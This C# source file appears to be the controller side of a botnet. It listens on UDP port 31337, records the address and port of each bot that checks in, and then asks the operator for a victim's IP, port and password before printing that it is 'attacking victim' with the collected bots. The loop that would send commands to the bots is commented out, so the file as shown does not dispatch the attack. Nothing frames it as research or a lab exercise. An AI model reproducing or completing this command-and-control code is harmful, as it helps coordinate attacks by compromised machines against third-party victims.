using System;
using System.Net;      //required
using System.Net.Sockets;    //required
using System.Threading;
using System.Collections.Generic;
using System.Text;

namespace Server
{
	public class Program
	{
		static HashSet<IPEndPoint> ip_port_bots = new HashSet<IPEndPoint>();

		public static string GetLocalIPAddress()
		{
			IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		public static void Main(string[] args)
		{
			UdpClient udpServer = new UdpClient(31337);
			Thread listenThread = new Thread(()=>
			{
				
				while (true)
				{
					IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 31337);
					byte[] data = udpServer.Receive(ref remoteEP); // listen on port 31337
																   //Console.WriteLine(BitConverter.ToInt32(data, 0));
																   //Console.WriteLine("data " + remoteEP.ToString());
					ip_port_bots.Add(new IPEndPoint(remoteEP.Address, BitConverter.ToUInt16(data, 0)));
					DisplaySet(ip_port_bots);
					//udpServer.Send(new byte[] { 1 }, 1, remoteEP); // reply back
				}


			}
			);
			listenThread.Start();

			Console.WriteLine("ip?");
			string ip_vic = Console.ReadLine();
			
			Console.WriteLine("port?");
			int port_vic = Int32.Parse(Console.ReadLine());
			Console.WriteLine("password?");
			string pass_vic = Console.ReadLine();

			byte[] ip_vic_arr = BitConverter.GetBytes((Int32)IPAddress.Parse(ip_vic).Address),
				port_vic_arr = BitConverter.GetBytes(port_vic),
				pass_vic_arr= Encoding.Default.GetBytes(pass_vic);

			Console.WriteLine("attacking victim on IP "+ip_vic+", port "+port_vic+" with "+ip_port_bots.Count+" bots");
			//foreach (IPEndPoint endPoint in ip_port_bots)
			//{
			//	udpServer.Send(new byte[], endPoint); // reply back
			//}


		}


		private static void DisplaySet(HashSet<IPEndPoint> set)
		{
			Console.Write("{ ");
			foreach (IPEndPoint endPoint in set)
			{
				Console.Write(endPoint.ToString());
			}
			Console.WriteLine(" }");
		}
	}
}